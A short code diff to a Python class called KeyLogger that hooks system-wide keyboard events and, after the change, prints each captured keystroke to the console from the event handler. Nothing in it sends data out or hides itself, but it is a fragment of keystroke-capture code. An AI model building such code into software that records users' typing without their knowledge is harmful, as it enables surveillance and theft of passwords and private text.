@@ -21,7 +21,7 @@ class KeyLogger(object):
         # print('Transition', event.Transition)
         # print('---')
         self.current_key = event.GetKey()
-
+        print(self.current_key)
     # return True to pass the event to other handlers
         return True
 
@@ -32,7 +32,6 @@ if __name__ == '__main__':
     # watch for all mouse events
     keylogger = KeyLogger()
     hm.KeyDown = keylogger.OnKeyboardEvent
-    print (keylogger.current_key)
     # set the hook
     hm.HookKeyboard()
     # wait forever
